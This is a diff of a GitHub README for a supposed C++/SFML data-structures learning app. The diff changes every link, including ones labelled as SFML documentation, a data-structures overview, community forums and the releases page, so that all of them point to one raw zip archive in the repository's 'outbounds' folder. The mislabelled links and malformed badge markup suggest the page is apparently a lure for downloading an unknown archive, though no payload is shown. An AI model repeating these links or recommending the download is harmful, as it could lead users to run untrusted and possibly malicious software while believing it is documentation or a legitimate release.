@@ -1,7 +1,7 @@
 # 🎉 Social-Networking-App- - Simplify Your Digital Connections
 
 ## 📥 Download the Latest Version
-[![Download Latest Release](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip%20Latest%https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
+[![Download Latest Release](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip%20Latest%https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)
 
 ## 🚀 Getting Started
 This application helps you understand and use different data structures in real-world scenarios. It is built using C++ and the SFML graphics library, making it both powerful and easy to use. With it, you can explore arrays, linked lists, graphs, and more while seeing how they apply to your digital interactions.
@@ -23,7 +23,7 @@ To get started with Social-Networking-App-, follow these steps:
 
 1. **Visit the Releases Page**  
    Go to our Releases page to download the latest version of the application:  
-   [Download Latest Release](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
+   [Download Latest Release](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)
 
 2. **Select Your Download**  
    Once on the Releases page, choose the version that matches your operating system. Click on the link to start your download. 
@@ -65,8 +65,8 @@ No, the app is designed for anyone who wants to learn about data structures, reg
 We aim to release updates regularly, focusing on improving features based on user feedback.
 
 ## 🔗 Additional Resources
-- [SFML Documentation](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
-- [Data Structures Overview](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
-- [Community Forums](https://raw.githubusercontent.com/tiocotafu2x39/Social-Networking-App-/main/outbounds/Social-Networking-App-.zip)
+- [SFML Documentation](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)
+- [Data Structures Overview](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)
+- [Community Forums](https://github.com/tiocotafu2x39/Social-Networking-App-/raw/refs/heads/main/outbounds/App_Social_Networking_v1.4.zip)
 
 Feel free to reach out through our community forums for any questions or support. Happy exploring!
